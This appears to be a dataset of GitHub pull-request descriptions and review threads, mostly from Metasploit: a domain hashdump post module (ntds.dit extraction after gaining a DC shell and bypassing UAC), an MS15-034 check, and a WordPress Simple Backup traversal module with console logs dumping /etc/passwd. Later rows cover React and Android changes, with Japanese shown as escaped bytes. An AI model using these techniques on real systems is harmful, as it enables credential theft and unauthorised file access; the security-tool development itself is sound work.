(These results courtesy of a delightful git alias, here:

```
  cleanup-prs = !""for i in `git status | grep modules | sed
s/#.*modules/modules/`; do echo -n \""Edited $i first landed in \"" && git
log --oneline --first-parent $i | tail -1 | sed 's/.*Land //' && echo
''; done""

```

So that's kind of fun.","['Updated. Thanks for the eyeballs @wvu-r7 ', 'https://github.com/rapid7/metasploit-framework/commit/c9cb9ad564f7f5de92348b613c0c626464ed18ae']"
547,rapid7/metasploit-framework,5348.0,"This adds the Post module to do a safe domain hashdump on a Domain controller Running server 2003 or later.

It requires https://github.com/rapid7/metasploit-framework/pull/5286 and https://github.com/rapid7/meterpreter/pull/154 to be landed first

After https://github.com/rapid7/meterpreter/pull/154 lands, the other two PRs will be updated with newly released versions of metasploit-payloads accordingly


VERIFICATION STEPS
- [x] Get a shell on a DC
- [x] make sure you have admin right and have bypassed UAC
- [x] make sure you are operating on the right Arch (x86 will not work on a x64 OS)
- [x] run the post module
- [x] VERIFY it dumps the domain account information
- [x] VERIFY the hashes are all saved to the db, by using the 'creds' command

LANDS MSP-12357
LANDS MSP-12358","['Awesome, may save me some time remembering all the args to dsusers.py and esedbextract or whatever :D ', 'At the moment, on Windows 2008 r2 and 2012 r2, I get a permissions issue dumping the database:\r\n```\r\nmeterpreter > sysinfo\r\nComputer        : WIN-JF2A9084V7J\r\nOS              : Windows 2008 R2 (Build 7601, Service Pack 1).\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nDomain          : HAUSCHEN\r\nLogged On Users : 2\r\nMeterpreter     : x64/win64\r\nmeterpreter > getsystem\r\nWARNING: Local file /Users/bcook/projects/metasploit-framework/data/meterpreter/elevator.x64.dll is being used\r\n...got system (via technique 1).\r\nmeterpreter > background\r\n[*] Backgrounding session 1...\r\nmsf post(domain_hashdump) > set verbose true\r\nverbose => true\r\nmsf post(domain_hashdump) > run\r\n\r\n[*] [localhost] wmic /output:CLIPBOARD /INTERACTIVE:off /node:localhost Service where(name=""VSS"") get state\r\n[*] Volume Shadow Copy service not running. Starting it now...\r\n[*] [VSS] Service already running attempting to stop and restart\r\n[+] [VSS] Service started\r\n[+] Volume Shadow Copy started successfully.\r\n[*] [localhost] wmic /output:CLIPBOARD /INTERACTIVE:off /node:localhost Service where(name=""swprv"") get state\r\n[*] Software Shadow Copy service not running. Starting it now...\r\n[*] [swprv] Service already running attempting to stop and restart\r\n[+] [swprv] Service started\r\n[+] Software Shadow Copy started successfully.\r\n[-] There was an error copying the ntds.dit file!\r\n[-] ntdsutil.exe: activate instance ntds\r\nActive instance set to ""ntds"".\r\nntdsutil.exe: ifm\r\nifm: Create Full C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\bnyWaWVoigkr\r\n error 0x5(Access is denied.)\r\nifm: quit\r\nntdsutil.exe: quit\r\n[*] Post module execution completed\r\n```\r\n\r\nRunning manually from the command line works fine, so I\'m not yet sure what the problem is.', ""I got it to work running through psexec, but ran into a different issue. Probably just a coincidence, but it should be noted that the session closed at the end of the dump:\r\n\r\n```\r\n[-] Post failed: OpenSSL::SSL::SSLError SSL_write: bad write retry\r\n[-] Call stack:\r\n[-]   /usr/local/Cellar/ruby21/2.1.5/lib/ruby/2.1.0/openssl/buffering.rb:326:in `syswrite'\r\n[-]   /usr/local/Cellar/ruby21/2.1.5/lib/ruby/2.1.0/openssl/buffering.rb:326:in `do_write'\r\n[-]   /usr/local/Cellar/ruby21/2.1.5/lib/ruby/2.1.0/openssl/buffering.rb:344:in `write'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/socket/ssl_tcp.rb:188:in `write'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:167:in `block in send_packet'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:165:in `synchronize'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:165:in `send_packet'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:193:in `send_request'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/channel.rb:282:in `_close'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/channel.rb:291:in `_close'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/rex/post/meterpreter/channel.rb:251:in `close'\r\n[-]   /Users/bcook/projects/metasploit-framework/lib/metasploit/framework/ntds/parser.rb:46:in `each_account'\r\n[-]   /Users/bcook/projects/metasploit-framework/modules/post/windows/gather/credentials/domain_hashdump.rb:41:in `run'\r\n```"", ""SYSTEM should probably be trying to write to %WINDIR%\\temp rather than user's %TEMP%. I guess env variables aren't updated from getsystem. "", '@Meatballs1 that could be, although SYSTEM should be able to write anywhere', '@bcook-r7 I cannot repro on my 2008R2 box. Used a manually run EXE and psexec. Both copied the file just fine, not sure what might be different', '@bcook-r7 just changed it to explicitly use %windir%\\temp, see if that resolves your permission issues. still works fine either way on my machines', ""Still no dice with the permissions, I'll keep poking at it."", ""I wound up moving this to extapi in: 732192aeaf59e3bd554add22e1a7ab5b8ec4d08f\r\nIt works well for me, but if there are any new bugs as a result of the move, I'll be happy to address them.""]"
548,rapid7/metasploit-framework,5386.0,"Currently only the /welcome.png is checked, however in practise, this file is barely there.

Furthermore, some scanners like Nessus often fail to properly detect the issue, and when it's detected, the vulnerable file is not provided.

I've improved the detection based on a script I created at work: https://github.com/RandomStorm/scripts/blob/master/ms15-034-checker.rb

The idea is to extract all potential static files from the index page and test them rather than just check the /welcome.png.

Output examples:

Vulnerable:
w/o Verbose:
```
msf auxiliary(ms15_034_ulonglongadd) > check

[*] X.X.X.X:80 - Checking /static/banner.jpg [416] - Vulnerable
[+] X.X.X.X:80 - The target is vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
```

with verbose:
```
msf auxiliary(ms15_034_ulonglongadd) > check

[*] X.X.X.X:80 - Checking /welcome.png [404] - Unknown
[*] X.X.X.X:80 - Checking /static/banner.jpg [416] - Vulnerable
[+] X.X.X.X:80 - The target is vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
```


Not vulnerable:
w/o verbose:
```
msf auxiliary(ms15_034_ulonglongadd) > check
[*] 192.168.1.24:80 - The target is not exploitable.
[*] Checked 1 of 1 hosts (100% complete)
```

with verbose:
```
msf auxiliary(ms15_034_ulonglongadd) > check

[*] 192.168.1.24:80 - Checking /welcome.png [400] - Safe
[*] 192.168.1.24:80 - The target is not exploitable.
[*] Checked 1 of 1 hosts (100% complete)
```


Unknown (Debian Server):
w/o verbose:
```
msf auxiliary(ms15_034_ulonglongadd) > check
[*] 192.168.1.103:80 - Cannot reliably check exploitability.
[*] Checked 1 of 1 hosts (100% complete)
```

with verbose
```
msf auxiliary(ms15_034_ulonglongadd) > check

[*] 192.168.1.103:80 - Checking /wordpress-4.2/welcome.png [404] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/xmlrpc.php [405] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-content/themes/twentyfifteen/genericons/genericons.css [200] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-content/themes/twentyfifteen/style.css [200] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-includes/js/jquery/jquery.js [200] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-includes/js/jquery/jquery-migrate.min.js [200] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-includes/wlwmanifest.xml [200] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js [200] - Unknown
[*] 192.168.1.103:80 - Checking /wordpress-4.2/wp-content/themes/twentyfifteen/js/functions.js [200] - Unknown
[*] 192.168.1.103:80 - Cannot reliably check exploitability.
[*] Checked 1 of 1 hosts (100% complete)
```

Some questions/remarks:
- https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/http/client.rb#L400 rhost shouldn't be replaced by vhost ? givent that if not supplied, the vhost is set to rhost
- Is there a VHOSTS option ? As there is a RHOSTS, it would seem logical to also have the plural form of VHOST, useful especially in scanner mode","['cc @FireFart for comments :D', 'Should /cc @wchen-r7 as well since he originally wrote the module', 'That looks smarter and more thoughtful, overall I like it.', 'Looking good. I will test this tomorrow, thanks @erwanlr ', ""Tried this PR. So the check part works, but the dos part doesn't anymore because whatever potential_static_files_uris finds isn't shared with the dos_host and get_file_size method."", 'the target_uri is now shared between the check and dos methods (thought is was by default but not huhu)', 'Module works perfectly. Excellent work @erwanlr , thanks again!', ""Yay !\r\n\r\nYou're welcome :)""]"
549,rapid7/metasploit-framework,5397.0,"#### Add Wordpress Plugin Simple Backup File Read Vulnerability.

  Application: Wordpress Plugin 'Simple Backup' 2.7.10
  Homepage: https://wordpress.org/plugins/simple-backup/
  Source Code: https://downloads.wordpress.org/plugin/simple-backup.2.7.10.zip
  Active Installs: 30,000+
  References: https://wpvulndb.com/vulnerabilities/7997

#### Vulnerable packages*
        
  2.7.10
  
#### Usage:

##### Linux (Ubuntu 14.04.2 LTS):
```
msf > use auxiliary/scanner/http/wp_simple_backup_file_read 
msf auxiliary(wp_simple_backup_file_read) > info

       Name: WordPress Simple Backup File Read Vulnerability
     Module: auxiliary/scanner/http/wp_simple_backup_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Mahdi.Hidden
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DEPTH      6                yes       Traversal Depth (to reach the root folder)
  FILEPATH   /etc/passwd      yes       The path to the file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in 
  WordPress Plugin ""Simple Backup"" version 2.7.10, allowing to read 
  arbitrary files with the web server privileges.

References:
  https://wpvulndb.com/vulnerabilities/7997
  http://packetstormsecurity.com/files/131919/

msf auxiliary(wp_simple_backup_file_read) > show options 

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_simple_backup_file_read) > set RHOSTS 10.10.10.20
RHOSTS => 10.10.10.20
msf auxiliary(wp_simple_backup_file_read) > check
[*] 10.10.10.20:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msf auxiliary(wp_simple_backup_file_read) > run

[+] 10.10.10.20:80 - File saved in: /home/espreto/.msf4/loot/20150521121154_default_10.10.10.20_simplebackup_614708.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_simple_backup_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(wp_simple_backup_file_read) > run

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
espreto:x:1000:1000:espreto,,,:/home/espreto:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:117:126:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:1001:1001::/home/postgres:

[+] 10.10.10.20:80 - File saved in: /home/espreto/.msf4/loot/20150521121203_default_10.10.10.20_simplebackup_264070.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_simple_backup_file_read) >
```","['@espreto the problem is the following:\r\nhttps://plugins.trac.wordpress.org/browser/simple-backup/tags/2.7.10/simple-backup-manager.php#L156\r\n\r\nThe content length header will always be the file size. In my case some PHP warnings are printed out, so your Check for response.body.length > 0 fires, because the error message is printed out. So the if should check the content length header instead of the body size.\r\n\r\nExample:\r\nExisting file, content length correct:\r\n```\r\nHTTP/1.1 200 OK\r\nDate: Wed, 03 Jun 2015 20:37:19 GMT\r\nServer: Apache/2.4.7 (Ubuntu)\r\nX-Powered-By: PHP/5.5.9-1ubuntu4.7\r\nContent-Description: File Transfer\r\nContent-Disposition: attachment; filename=../../../../../../../../../etc/passwd\r\nContent-Length: 1279\r\nConnection: close\r\nContent-Type: application/octet-stream\r\n\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\r\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\r\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\r\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\r\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\r\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\r\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\r\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\r\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r\nlibuuid:x:100:101::/var/lib/libuuid:\r\nsyslog:x:101:104::/home/syslog:/bin/false\r\nmessagebus:x:102:106::/var/run/dbus:/bin/false\r\nlandscape:x:103:109::/var/lib/landscape:/bin/false\r\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\r\nfirefart:x:1000:1000:firefart,,,:/home/firefart:/bin/bash\r\nmysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/false\r\nelasticsearch:x:106:114::/usr/share/elasticsearch:/bin/false\r\n```\r\n\r\nNon existent file (notice the body.length is greater 0 but the content length header is 0):\r\n```\r\nHTTP/1.1 200 OK\r\nDate: Wed, 03 Jun 2015 20:38:21 GMT\r\nServer: Apache/2.4.7 (Ubuntu)\r\nX-Powered-By: PHP/5.5.9-1ubuntu4.7\r\nContent-Description: File Transfer\r\nContent-Disposition: attachment; filename=../../../../../../../../../etc/passssswd\r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: application/octet-stream\r\n\r\n<br />\r\n<b>Warning</b>:  readfile(/var/www/wordpress/simple-backup/../../../../../../../../../etc/passssswd): failed to open stream: No such file or directory in <b>/var/www/wordpress/wp-content/plugins/simple-backup/simple-backup-manager.php</b> on line <b>168</b><br />\r\n```', 'landed, thanks @espreto \r\n\r\n@FireFart feedback added here: https://github.com/rapid7/metasploit-framework/commit/184c20cd464f55378884fd75cd0659b791069cb1\r\n\r\nTest:\r\n\r\n```\r\nmsf auxiliary(wp_simple_backup_file_read) > rerun\r\n[*] Reloading module...\r\n\r\n[+] 172.16.158.133:80 - File saved in: /Users/jvazquez/.msf4/loot/20150612153128_default_172.16.158.133_simplebackup.tra_943621.txt\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(wp_simple_backup_file_read) > cat /Users/jvazquez/.msf4/loot/20150612153128_default_172.16.158.133_simplebackup.tra_943621.txt\r\n[*] exec: cat /Users/jvazquez/.msf4/loot/20150612153128_default_172.16.158.133_simplebackup.tra_943621.txt\r\n\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\nbin:x:2:2:bin:/bin:/bin/sh\r\nsys:x:3:3:sys:/dev:/bin/sh\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/bin/sh\r\nman:x:6:12:man:/var/cache/man:/bin/sh\r\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\r\nmail:x:8:8:mail:/var/mail:/bin/sh\r\nnews:x:9:9:news:/var/spool/news:/bin/sh\r\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\r\nproxy:x:13:13:proxy:/bin:/bin/sh\r\nwww-data:x:33:33:www-data:/var/www:/bin/sh\r\nbackup:x:34:34:backup:/var/backups:/bin/sh\r\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\r\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\r\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\r\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\r\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\r\nsyslog:x:101:103::/home/syslog:/bin/false\r\nmessagebus:x:102:107::/var/run/dbus:/bin/false\r\navahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false\r\navahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false\r\ncouchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash\r\nspeech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh\r\nusbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false\r\nhaldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false\r\nkernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false\r\npulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false\r\nrtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false\r\nsaned:x:112:118::/home/saned:/bin/false\r\nhplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false\r\ngdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false\r\njuan:x:1000:1000:Juan Vazquez,,,:/home/juan:/bin/bash\r\nmysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false\r\nsshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin\r\n```']"
550,reactjs/react-rails,196.0,"Addresses reactjs/react-rails#122.  Adds a new `replay_console: true` option, to be used in conjunction with `prerender: true` on the `react_component` view helper (can assist in debugging).  Updated README and added integration tests.","[""Thank you for your pull request and welcome to our community. We require contributors to sign our Contributor License Agreement, and we don't seem to have you on file. In order for us to review and merge your code, please sign up at https://code.facebook.com/cla - and if you have received this in error or have any questions, please drop us a line at cla@fb.com. Thanks!"", 'Thank you for signing our Contributor License Agreement. We can now accept your code for this (and any) Facebook open source project. Thanks!', 'Overall, I really like this PR.', 'Great feature! This will be a big win for day-to-day happiness! ', ""Thanks @xionon, @rmosolgo, and @vipulnsward for all the feedback and getting this into better shape.  Hoping this can make it into master. I've been using this branch locally and it's been helpful for my workflow."", 'Changes look great! :+1: ', '@bikegriffith added more comments. Looking forward to this. :smile:  ', 'looks good to me, last call @vipulnsward @xionon ?', 'LGTM . @bikegriffith can you squash the commits? Its good to track this as a single change to refer in future.', ""@vipulnsward I attempted to squash the commits and also pulled the latest from upstream.  Let me know if I did anything weird and I'll try to correct.  Thanks!"", 'Ah, I am afraid an extra commit got in. But that should be ok, since https://github.com/bikegriffith/react-rails/commit/585963f81181891bfb2f64c44e1ad103a67a097e is a clean commit.\r\nSo :+1: ', ""Just got a chance to try this out locally. (It took some finagling, my app isn't prerender-ready!). \r\n\r\nI noticed this outputs a warning, too:\r\n\r\n![image](https://cloud.githubusercontent.com/assets/2231765/6641862/c3100006-c95d-11e4-909d-37dacaad4419.png)\r\n\r\n(Ignore the _uniform notifier_, that's some other library complaining)\r\n\r\nBut this seems OK with me, since it's meant for development only (right?).\r\n"", ""@rmosolgo I only intended it to be used for development, so I'm less concerned ~~but it is strange because I wasn't seeing it. Are you on ReactJS 0.13?~~\r\n\r\nEDIT: I'm seeing it now also (on React 0.13).  It doesn't appear if you disable the `replay_console` option."", ""Yep, that was 0.13. I checked out your branch so I'm not sure how that snuck in there! Maybe because react-rails/master has 0.13 now"", ':confetti_ball: thanks!']"
551,rejasupotaro/Rebuild,23.0,Pull,"['`header_episode_list.xml` \xe3\x81\xaf\xe3\x82\xb3\xe3\x83\xbc\xe3\x83\x89\xe3\x82\xb9\xe3\x82\xbf\xe3\x82\xa4\xe3\x83\xab\xe4\xbb\xa5\xe5\xa4\x96\xe3\x81\xafOK\xe3\x81\xa7\xe3\x81\x99:ok_hand:\r\n\r\n`header_episode_detail.xml` \xe3\x81\x8ccenterCrop\xe3\x81\xa0\xe3\x81\xa8\xe8\xa6\x8b\xe5\x88\x87\xe3\x82\x8c\xe3\x81\xa6\xe3\x81\x97\xe3\x81\xbe\xe3\x81\x86\xe3\x81\xae\xe3\x81\xa7\xe3\x80\x81\xe6\x82\xa9\xe3\x81\xbe\xe3\x81\x97\xe3\x81\x84\xe3\x81\xae\xe3\x81\xa7\xe3\x81\x99\xe3\x81\x8c\xe3\x80\x81fitCenter\xe3\x81\xae\xe6\x96\xb9\xe3\x81\x8c\xe3\x81\x84\xe3\x81\x84\xe3\x81\x8b\xe3\x81\xaa\xe3\x81\xa8\xe6\x80\x9d\xe3\x81\x84\xe3\x81\xbe\xe3\x81\x97\xe3\x81\x9f\xe3\x80\x82\r\n\r\n```xml\r\n<ImageView\r\n        android:layout_width=""match_parent""\r\n        android:layout_height=""match_parent""\r\n        android:background=""@android:color/black""\r\n        android:src=""@drawable/miyagawa_in_yapc""\r\n        android:scaleType=""fitCenter""\r\n        />\r\n```\r\n\r\n![](https://pbs.twimg.com/media/BhzohanCEAA5iqF.png)\r\n\r\n\xe3\x82\xbf\xe3\x83\x96\xe3\x83\xac\xe3\x83\x83\xe3\x83\x88\xe3\x81\xae\xe3\x81\xa8\xe3\x81\x8d\xe3\x81\xab\xe9\xab\x98\xe3\x81\x95\xe3\x82\x92\xe5\xa4\x89\xe3\x81\x88\xe3\x82\x8b\xe3\x81\xa8\xe3\x81\x84\xe3\x81\x86\xe6\x89\x8b\xe3\x82\x82\xe3\x81\x82\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xe3\x81\x8c\xe2\x80\xa6\xe3\x80\x82', ""\xe3\x81\x86\xe3\x83\xbc\xe3\x82\x93\xe3\x80\x81\xe6\x82\xa9\xe3\x81\xbe\xe3\x81\x97\xe3\x81\x84\xe3\x81\xa7\xe3\x81\x99\xe3\x81\xad\xe3\x80\x82\xe3\x80\x82\xe3\x80\x80\xe3\x81\xa8\xe3\x82\x8a\xe3\x81\x82\xe3\x81\x88\xe3\x81\x9a'fitCenter'\xe3\x81\xa7\xe3\x80\x82\xe3\x80\x82\r\n\xe3\x81\x82\xe3\x81\xa8\xe3\x80\x81mp3\xe3\x81\xab\xe3\x82\xa8\xe3\x83\x94\xe3\x82\xbd\xe3\x83\xbc\xe3\x83\x89\xe3\x81\x94\xe3\x81\xa8\xe3\x81\xae\xe3\x82\xab\xe3\x83\x90\xe3\x83\xbc\xe3\x82\xa4\xe3\x83\xa1\xe3\x83\xbc\xe3\x82\xb8\xe3\x82\x92\xe5\x9f\x8b\xe3\x82\x81\xe8\xbe\xbc\xe3\x82\x93\xe3\x81\xa7\xe3\x82\x82\xe3\x82\x89\xe3\x81\x86\xe3\x82\x88\xe3\x81\x86@miyagawa\xe3\x81\x95\xe3\x82\x93\xe3\x81\xab\xe3\x81\x8a\xe9\xa1\x98\xe3\x81\x84\xe3\x81\x97\xe3\x81\xa6\xe3\x81\x8a\xe3\x81\x8d\xe3\x81\xbe\xe3\x81\x97\xe3\x81\x9f:)"", '\xe5\xaf\xbe\xe5\xbf\x9c\xe3\x81\x82\xe3\x82\x8a\xe3\x81\x8c\xe3\x81\xa8\xe3\x81\x86\xe3\x81\x94\xe3\x81\x96\xe3\x81\x84\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81\r\n\xe3\x81\xa8\xe3\x82\x8a\xe3\x81\x82\xe3\x81\x88\xe3\x81\x9afitCenter\xe3\x81\xab\xe3\x81\xaf\xe3\x81\x97\xe3\x81\xbe\xe3\x81\x99\xe3\x81\x8c\xe3\x80\x81\xe3\x81\x93\xe3\x82\x8c\xe3\x82\x82\xe3\x81\x82\xe3\x81\xa8\xe3\x81\xa7\xe5\xa4\x89\xe6\x9b\xb4\xe3\x81\x99\xe3\x82\x8b\xe3\x81\x8b\xe3\x82\x82\xe3\x81\x97\xe3\x82\x8c\xe3\x81\xbe\xe3\x81\x9b\xe3\x82\x93\xe3\x80\x82\r\n\r\n> mp3\xe3\x81\xab\xe3\x82\xa8\xe3\x83\x94\xe3\x82\xbd\xe3\x83\xbc\xe3\x83\x89\xe3\x81\x94\xe3\x81\xa8\xe3\x81\xae\xe3\x82\xab\xe3\x83\x90\xe3\x83\xbc\xe3\x82\xa4\xe3\x83\xa1\xe3\x83\xbc\xe3\x82\xb8\xe3\x82\x92\xe5\x9f\x8b\xe3\x82\x81\xe8\xbe\xbc\xe3\x82\x93\xe3\x81\xa7\xe3\x82\x82\xe3\x82\x89\xe3\x81\x86\xe3\x82\x88\xe3\x81\x86@miyagawa\xe3\x81\x95\xe3\x82\x93\xe3\x81\xab\xe3\x81\x8a\xe9\xa1\x98\xe3\x81\x84\xe3\x81\x97\xe3\x81\xa6\xe3\x81\x8a\xe3\x81\x8d\xe3\x81\xbe\xe3\x81\x97\xe3\x81\x9f:)\r\n\r\n\xe3\x81\x99\xe3\x81\x94\xe3\x81\x8f\xe3\x81\x84\xe3\x81\x84\xe3\x81\xa7\xe3\x81\x99\xe3\x81\xad\xe3\x80\x9c:+1:\r\n\r\n\xe3\x81\x93\xe3\x81\xae\xe3\x83\x97\xe3\x83\xab\xe3\x83\xaa\xe3\x82\xaf\xe3\x81\xaf\xe3\x83\x9e\xe3\x83\xbc\xe3\x82\xb8\xe3\x81\x97\xe3\x81\xbe\xe3\x81\x99\xe3\x81\x8c\xe3\x80\x81\xe3\x82\xa2\xe3\x83\x97\xe3\x83\xaa\xe3\x81\xab\xe3\x82\xb3\xe3\x83\xb3\xe3\x83\x88\xe3\x83\xaa\xe3\x83\x93\xe3\x83\xa5\xe3\x83\xbc\xe3\x82\xbf\xe3\x83\xbc\xe3\x81\xa8\xe3\x81\x97\xe3\x81\xa6hak\xe3\x81\x95\xe3\x82\x93\xe3\x81\xae\xe5\x90\x8d\xe5\x89\x8d\xe3\x82\x92\xe8\xbf\xbd\xe5\x8a\xa0\xe3\x81\x97\xe3\x81\xa6\xe3\x82\x82\xe3\x81\x84\xe3\x81\x84\xe3\x81\xa7\xe3\x81\x99\xe3\x81\x8b\xef\xbc\x9f: https://github.com/rejasupotaro/Rebuild/pull/25']"
